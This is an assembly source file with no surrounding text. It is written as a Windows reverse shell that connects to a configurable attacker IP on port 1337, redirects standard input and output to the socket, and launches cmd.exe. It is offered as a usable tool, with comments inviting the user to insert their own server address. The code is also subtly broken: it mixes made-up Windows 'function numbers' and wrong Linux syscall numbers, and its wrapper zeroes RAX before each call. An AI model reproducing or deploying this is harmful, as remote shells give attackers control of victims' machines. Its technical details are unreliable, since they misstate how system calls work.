
section .data
  server_ip db '192.168.0.1'  ; Change this to your server's IP address
  server_port equ 1337        ; Change this to your desired port

section .text
  global _start

_start:
  ; Initialize Winsock
  xor rdx, rdx
  push rdx
  mov rax, 0x30                  ; WSAStartup function number
  lea rdi, [rdx + server_ip]
  mov rsi, rdi
  mov rdx, 0xFFFFFFFF
  mov rcx, 0x02
  call WinSockFunction

  ; Create socket
  mov rax, 0x20                  ; socket function number
  lea rdi, [rdx]
  mov rsi, 0x02                  ; AF_INET
  mov rdx, 0x01                  ; SOCK_STREAM
  mov ecx, 0x06                  ; IPPROTO_TCP
  call WinSockFunction

  ; Connect to server
  mov rax, 0x22                  ; connect function number
  lea rdi, [rdx]
  lea rsi, [rdx + server_ip]
  mov rdx, server_port
  call WinSockFunction

  ; Duplicate socket for stdin, stdout, and stderr
  xor rsi, rsi
  lea rdi, [rdx]
  mov rax, 0x33                  ; syscall number for dup2
  xor rdx, rdx
  call syscall

  mov rdi, rax
  lea rsi, [rdx + 0x1]           ; fd2
  mov rax, 0x33                  ; syscall number for dup2
  xor rdx, rdx
  call syscall

  mov rdi, rax
  lea rsi, [rdx + 0x2]           ; fd3
  mov rax, 0x33                  ; syscall number for dup2
  xor rdx, rdx
  call syscall

  ; Execute shell
  lea rdi, [rdx + shell_cmd]
  xor rsi, rsi
  xor rdx, rdx
  mov rax, 0x21                  ; syscall number for execve
  call syscall

  ; Exit
  mov rax, 0x4C                  ; syscall number for exit
  xor rdi, rdi                   ; exit code 0
  syscall

section .data
  shell_cmd db 'cmd.exe', 0

WinSockFunction:
  mov r10, rdx                   ; Save the current RDX value
  mov rdx, r8                    ; Move the fourth parameter to RDX
  mov r8, rcx                    ; Move the third parameter to R8
  mov rcx, rsi                   ; Move the second parameter to RCX
  mov rsi, rdi                   ; Move the first parameter to RSI
  mov rdi, r10                   ; Move the saved RDX value to RDI
  syscall
  ret

syscall:
  ; System call wrapper
  xor rax, rax                   ; Clear RAX register
  syscall
  ret
